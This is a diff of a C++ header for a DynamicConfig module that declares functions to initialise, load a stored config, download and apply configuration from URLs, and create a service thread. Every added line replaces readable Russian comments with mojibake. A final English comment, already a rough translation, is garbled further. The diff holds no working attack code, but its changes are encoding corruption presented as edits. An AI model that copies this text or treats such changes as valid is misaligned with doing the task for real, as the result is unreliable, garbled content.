@@ -1,5 +1,5 @@
 /*
-  Работа с DynamicConfig.
+  Р Р°Р±РѕС‚Р° СЃ DynamicConfig.
 */
 #pragma once
 
@@ -9,37 +9,37 @@
 namespace DynamicConfig
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
   
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
   
   /*
-    Загрузка текущей конфигурации в память процесса.
+    Р—Р°РіСЂСѓР·РєР° С‚РµРєСѓС‰РµР№ РєРѕРЅС„РёРіСѓСЂР°С†РёРё РІ РїР°РјСЏС‚СЊ РїСЂРѕС†РµСЃСЃР°.
 
-    Return - указатель на конфиг(необходимо освободить через Mem), или NULL в случаи ошибки.
+    Return - СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РєРѕРЅС„РёРі(РЅРµРѕР±С…РѕРґРёРјРѕ РѕСЃРІРѕР±РѕРґРёС‚СЊ С‡РµСЂРµР· Mem), РёР»Рё NULL РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   BinStorage::STORAGE *getCurrent(void);
   
   /*
-    Загрузка и применение конфигураци.
+    Р—Р°РіСЂСѓР·РєР° Рё РїСЂРёРјРµРЅРµРЅРёРµ РєРѕРЅС„РёРіСѓСЂР°С†Рё.
 
-    IN url - URL конфигурации, или NULL для загрузки изветных URL.
-    Return - true - если успешно загржена,
-             false - в случаи ошибки.
+    IN url - URL РєРѕРЅС„РёРіСѓСЂР°С†РёРё, РёР»Рё NULL РґР»СЏ Р·Р°РіСЂСѓР·РєРё РёР·РІРµС‚РЅС‹С… URL.
+    Return - true - РµСЃР»Рё СѓСЃРїРµС€РЅРѕ Р·Р°РіСЂР¶РµРЅР°,
+             false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
   */
   bool download(LPSTR url);
   
-  /*В В В В Thread creation.
+  /*Р’В Р’В Р’В Р’В Thread creation.
 
-В В В В IN OUT group - the group potokok to which will belong to the flow of service.
-В В В В 
-В В В В Return - true - if successful,
-В В В В В В В В В В В В В В В В В В В false - if an error occurs.
-В В */
+Р’В Р’В Р’В Р’В IN OUT group - the group potokok to which will belong to the flow of service.
+Р’В Р’В Р’В Р’В 
+Р’В Р’В Р’В Р’В Return - true - if successful,
+Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В Р’В false - if an error occurs.
+Р’В Р’В */
   bool create(ThreadsGroup::GROUP *group);
 };
